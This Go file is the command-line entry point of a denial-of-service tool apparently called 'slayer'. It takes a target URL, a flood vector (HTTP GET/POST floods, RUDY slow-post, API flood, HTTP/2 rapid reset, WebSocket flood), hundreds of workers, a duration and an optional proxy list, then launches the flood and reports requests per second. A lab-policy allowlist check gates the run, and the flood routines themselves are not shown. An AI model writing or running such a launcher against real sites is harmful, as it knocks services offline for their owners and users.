package main

import (
	"context"
	"flag"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/kjsst/sh-mvdos/internal/guard"
	"github.com/kjsst/sh-mvdos/internal/vector"
)

func main() {
	target := flag.String("t", "", "target URL (e.g. https://example.com)")
	method := flag.String("m", "httpget", "vector: httpget, httppost, rudy, apiflood, h2-rapid-reset, ws-flood (+ aliases)")
	workerCount := flag.Int("w", 500, "number of workers")
	streams := flag.Int("s", 0, "streams (H2/WS/L7 parallel; 0 = vector default)")
	batch := flag.Int("b", 0, "batch size (0 = vector default)")
	dur := flag.Int("d", 300, "duration in seconds")
	proxyFile := flag.String("p", "", "proxy file path (optional)")
	wsPath := flag.String("ws-path", "", "websocket path (ws-flood)")
	vectorsPath := flag.String("vectors", "configs/vectors.yaml", "vectors registry path")
	policyPath := flag.String("policy", "data/lab-policy.yaml", "lab policy for allowlist check")
	flag.Parse()

	if *target == "" {
		fmt.Fprintln(os.Stderr, "usage: slayer -t <url> [-m vector] [-w workers] [-d duration] [-p proxyfile]")
		fmt.Fprintln(os.Stderr, "vectors: httpget | httppost | rudy | apiflood | h2-rapid-reset | ws-flood")
		fmt.Fprintln(os.Stderr, "aliases: get post api rapidreset wsflood")
		flag.PrintDefaults()
		os.Exit(1)
	}

	reg, err := vector.LoadRegistry(*vectorsPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "vectors: %v\n", err)
		os.Exit(1)
	}
	spec, err := reg.Resolve(*method)
	if err != nil {
		fmt.Fprintf(os.Stderr, "unknown vector: %s (%v)\n", *method, err)
		os.Exit(1)
	}

	ctx, err := guard.MustAuthorize(guard.Config{
		PolicyPath: *policyPath,
		TargetURL:  *target,
		Vector:     "slayer",
	})
	if err != nil {
		fmt.Fprintf(os.Stderr, "refused: %v\n", err)
		os.Exit(guard.ExitCode(err))
	}

	proxyPath := strings.TrimSpace(*proxyFile)
	if proxyPath == "" {
		proxyPath = os.Getenv("PROXY_FILE")
	}
	ws := strings.TrimSpace(*wsPath)
	if ws == "" {
		ws = os.Getenv("WS_PATH")
	}

	scale := vector.Scale{
		Workers:   *workerCount,
		Streams:   *streams,
		Batch:     *batch,
		ProxyFile: proxyPath,
		WSPath:    ws,
	}
	scale = spec.FillDefaults(spec.ApplyCapabilities(scale))

	fmt.Printf("slayer → %s vector=%s workers=%d streams=%d batch=%d duration=%ds protocol=%s\n",
		*target, spec.ID, scale.Workers, scale.Streams, scale.Batch, *dur, spec.Protocol)

	runCtx, cancel := context.WithTimeout(ctx, time.Duration(*dur)*time.Second)
	defer cancel()
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() { <-sig; cancel() }()

	start := time.Now()
	res, runErr := vector.Run(runCtx, spec, *target, scale)
	fmt.Printf("done: attempts=%d errors=%d rps=%.1f protocol=%s actual=%s elapsed=%s",
		res.Attempts, res.Errors, res.RPS, res.Protocol, res.ActualMode, time.Since(start).Round(time.Second))
	if runErr != nil && runErr != context.DeadlineExceeded && runErr != context.Canceled {
		fmt.Printf(" err=%v", runErr)
	}
	fmt.Println()
}